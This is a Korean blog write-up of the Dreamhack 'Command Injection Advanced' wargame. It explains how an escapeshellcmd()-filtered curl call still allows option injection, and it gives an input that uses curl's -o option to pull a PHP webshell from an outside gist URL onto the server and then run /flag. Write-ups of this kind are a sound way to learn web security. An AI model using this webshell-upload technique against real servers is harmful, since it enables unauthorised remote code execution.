---
title: "드림핵 lv.1 - Command Injection Advanced"
date: 2025-03-07 00:20:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, command injection, webshell injection, php] 
description: 드림핵 Command Injection Advanced 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/413](https://dreamhack.io/wargame/challenges/413)
# 문제 설명
Exercise: Command Injection Advanced에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
### main page
메인 페이지는 분석할 만한 것이 딱히 없다.<br />
단순히 어떠한 url을 받는 인풋 박스가 있고 submit 버튼이 전부다. 테스트용으로 "http://localhost:8080"라는 값을 제출하니까 어떤 파일이 `./cache`라는 디렉토리에 생성됐다는 메세지를 볼 수 있다.
```
cache file: ./cache/37d007a56d816107ce5b52c10342db37
```
## 코드 분석
```
[Code Structure]
deploy/
	- src/
		- index.php
	- flag.c
	- run-lamp.sh
Dockerfile
```
### flag.c
```c
#include <stdio.h>

void main(){
	puts("DH{**flag**}\n");
}
```
해당 파일은 플래그를 출력하는 코드가 담겨져있다. 아마 이 문제의 목적은 이 c 파일을 실행시키는 것인 듯 하다.
### Dockerfile
```
# FLAG
COPY deploy/flag.c /flag.c
RUN apt install -y gcc \
    && gcc /flag.c -o /flag \
    && chmod 111 /flag && rm /flag.c
```
파일의 중간 부분을 보면 플래그와 관련된 설정이 보인다.<br />
서버가 실행될 때 `deploy/flag.c`를 `/flag.c`로 복사하고 컴파일을 수행하여 실행 가능한 파일로 만드는 과정을 거치는 것 같다.<br />
간단히 말해서 해당 서버의 루트 디렉토리에 플래그를 출력해주는 flag라는 실행 파일이 존재한다는 것이다.
### index.php
```php
if(isset($_GET['url'])){
	$url = $_GET['url'];
	if(strpos($url, 'http') !== 0 ){
		die('http only !');
	}else{
		$result = shell_exec('curl '. escapeshellcmd($_GET['url']));
		$cache_file = './cache/'.md5($url);
		file_put_contents($cache_file, $result);
		echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
		echo '<pre>'. htmlentities($result) .'</pre>';
		return;
	}
}
```
코드를 살펴보면 url이 입력됐을 때 url 값에 http가 가장 처음으로 등장하는지 확인하고 그렇다면 `curl + url`을 실행한다. <br /> 그런데 curl을 실행하기 이전에 php의 `escapeshellcmd()` 함수를 이용해서 메타 문자들의 사용을 방지한다.<br />

그러고 나서 cache 파일을 하나 생성하고 curl 명령어의 결과를 해당 파일에 저장한 후 화면에 출력한다. 
## 최종 풀이
테스트용으로  내 블로그 주소와 `--include` 옵션을 추가한 `http://www.hoonsooni.com --include` 문자열을 제출해보니 HTTP response가 출력되는 것을 보니 php 코드 그대로 작동하는 것을 알 수 있다.<br />

우리의 목표는 /flag 파일의 실행 결과를 보는 것인데 단순 url을 조작하는 것으로는 충분하지 않은 것 같다. 아무래도 웹쉘을 업로드해서 해당 웹쉘에서 플래그 파일에 접근하는 것이 좋을 듯 하다.<br />
### 웹쉘 업로드하기
`escapeshellcmd()` 함수는 메타 문자를 먹통 시켜버리는 좋은 함수이지만 command에 전달하는 옵션까지는 어떻게 하지 못한다. <br />
그래서 우리는 `-o` 옵션을 이용하여 임의의 파일을 서버에 저장할 수 있다. 여기서 웹쉘을 저장할 길이 생긴 셈이다.<br />

이제 웹쉘을 서버에서 가져와야하는데 개인 서버가 있다면 본인 서버에 webshell.php을 작성해도 되고 아니면 인터넷에서 웹쉘을 얻어올 수도 있다. <br />
본인은 개인 서버가 없기 때문에 구글에 webshell raw file을 검색하여 얻어냈다. [webshell raw file](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php)<br />

```
https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php -o ./cache/webshell.php
```
위는 웹쉘을 업로드하는 url 값이다.
### 웹쉘 실행하기
이렇게 함으로써 `{dreamhackurl}/cache/webshell.php`에 접근해 웹쉘을 취득할 수 있다.<br />
cmd값으로 /flag를 넣어주면 곧바로 플래그가 출력된다.
# 배운 것
순수 webshell 코드를 깃허브를 통해 얻을 수 있다는 것을 알게됐다.<br />
curl의 -o 옵션을 통해 command injection을 이용한 webshell injection도 가능하다는 것을 배웠다.<br />